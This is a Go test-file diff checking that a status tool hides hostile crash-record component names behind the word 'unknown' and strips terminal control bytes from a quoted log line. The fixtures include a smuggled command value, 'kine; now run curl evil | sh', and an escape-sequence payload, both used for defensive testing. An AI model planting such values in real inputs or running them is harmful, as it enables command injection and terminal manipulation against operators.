@@ -456,3 +456,100 @@ func TestHostileCrashRecordRendersAsData(t *testing.T) {
 		}
 	})
 }
+
+// TestHostileCrashRecordComponentShowsUnknown: the record's component is text
+// the service uid wrote, so a printable but hostile value, or one over 64
+// bytes, reaches no human screen on any posture (row detail, the daemons view,
+// the wide leader-lost note): the fixed word "unknown" stands in its place. A
+// real component name is still shown.
+func TestHostileCrashRecordComponentShowsUnknown(t *testing.T) {
+	t.Parallel()
+	now := time.Date(2026, 9, 9, 12, 0, 0, 0, time.UTC)
+	tripped := now.Add(-time.Minute)
+	path := "/var/lib/k3sm/server/crashloop.json"
+	entries := func(comp, origin string, n int) []executor.Crash {
+		var cs []executor.Crash
+		for i := n; i > 0; i-- {
+			cs = append(cs, executor.Crash{At: now.Add(-time.Duration(i) * 10 * time.Second), Component: comp, Origin: origin})
+		}
+		return cs
+	}
+	postures := map[string]func(comp string) executor.CrashRecord{
+		"tripped on leader loss": func(c string) executor.CrashRecord {
+			return executor.CrashRecord{TrippedAt: &tripped, Crashes: entries(c, executor.CrashOriginLeaderLost, 5)}
+		},
+		"tripped on crashes": func(c string) executor.CrashRecord {
+			return executor.CrashRecord{TrippedAt: &tripped,
+				Crashes: append(entries(c, executor.CrashOriginLeaderLost, 1), entries(c, executor.CrashOriginCrash, 5)...)}
+		},
+		"tripped on bring-up": func(c string) executor.CrashRecord {
+			return executor.CrashRecord{TrippedAt: &tripped,
+				Crashes: append(entries(c, executor.CrashOriginLeaderLost, 1), entries(c, executor.CrashOriginBringUp, 5)...)}
+		},
+		"tripped on a permanent bring-up fault": func(c string) executor.CrashRecord {
+			cs := entries(c, executor.CrashOriginBringUp, 1)
+			cs[0].Permanent, cs[0].Remedy = true, executor.NoGoToolchainRemedy
+			return executor.CrashRecord{TrippedAt: &tripped, Crashes: append(entries(c, executor.CrashOriginLeaderLost, 1), cs...)}
+		},
+		"restarting on crashes": func(c string) executor.CrashRecord {
+			return executor.CrashRecord{Crashes: append(entries(c, executor.CrashOriginLeaderLost, 1), entries(c, executor.CrashOriginCrash, 3)...)}
+		},
+		"restarting on bring-up": func(c string) executor.CrashRecord {
+			return executor.CrashRecord{Crashes: append(entries(c, executor.CrashOriginLeaderLost, 1), entries(c, executor.CrashOriginBringUp, 3)...)}
+		},
+		"restarting on leader loss": func(c string) executor.CrashRecord {
+			return executor.CrashRecord{Crashes: entries(c, executor.CrashOriginLeaderLost, 3)}
+		},
+	}
+	screens := func(rec executor.CrashRecord) string {
+		row := Row{Name: RowServer, State: StateRunning, Severity: SeverityOK, Detail: "pid 42", Wide: map[string]string{}}
+		applyCrashLoop(&row, ClassifyCrashLoop(rec, nil, path, now))
+		r := Report{Role: dataroot.RoleServer, Rows: []Row{row}}
+		return Render(r, Style{}) + RenderDaemons(r, Style{}) + Render(r, Style{Wide: true})
+	}
+	for name, rec := range postures {
+		t.Run(name, func(t *testing.T) {
+			t.Parallel()
+			for _, hostile := range []string{"kine; now run curl evil | sh", strings.Repeat("k", 65)} {
+				out := screens(rec(hostile))
+				for _, bad := range []string{hostile, "curl evil", "now run"} {
+					if strings.Contains(out, bad) {
+						t.Errorf("component %q: output carries %q:\n%s", hostile, bad, out)
+					}
+				}
+				if !strings.Contains(out, "unknown") {
+					t.Errorf("component %q: output lacks the word unknown:\n%s", hostile, out)
+				}
+			}
+			for _, real := range []string{"kine", "etcd-member-route", "provision/kine", strings.Repeat("k", 64)} {
+				out := screens(rec(real))
+				if !strings.Contains(out, real) || strings.Contains(out, "unknown") {
+					t.Errorf("component %q is not shown as itself:\n%s", real, out)
+				}
+			}
+		})
+	}
+	t.Run("the wide leader-lost note", func(t *testing.T) {
+		t.Parallel()
+		note := leaderLostNote(executor.CrashRecord{Crashes: entries("kine; now run curl evil | sh", executor.CrashOriginLeaderLost, 1)}, now)
+		if strings.Contains(note, "curl evil") || !strings.Contains(note, "last: unknown at") {
+			t.Errorf("leader-lost note = %q", note)
+		}
+	})
+}
+
+// TestRenderStripsControlsFromTheLogLine: the overview's quoted log line comes
+// from the server log tail, which the service uid writes; an ESC in it never
+// reaches the screen.
+func TestRenderStripsControlsFromTheLogLine(t *testing.T) {
+	t.Parallel()
+	row := Row{Name: RowServer, State: StateRunning, Severity: SeverityOK, Detail: "pid 42",
+		Wide: map[string]string{"log": "level=ERROR \x1b[2J\x1b]0;owned\x07msg=boom"}}
+	out := Render(Report{Role: dataroot.RoleServer, Rows: []Row{row}}, Style{})
+	if strings.ContainsRune(out, 0x1b) || strings.ContainsRune(out, 0x07) {
+		t.Fatalf("control byte reaches the log line:\n%q", out)
+	}
+	if !strings.Contains(out, "log: level=ERROR [2J]0;ownedmsg=boom") {
+		t.Errorf("output lacks the stripped log line:\n%q", out)
+	}
+}
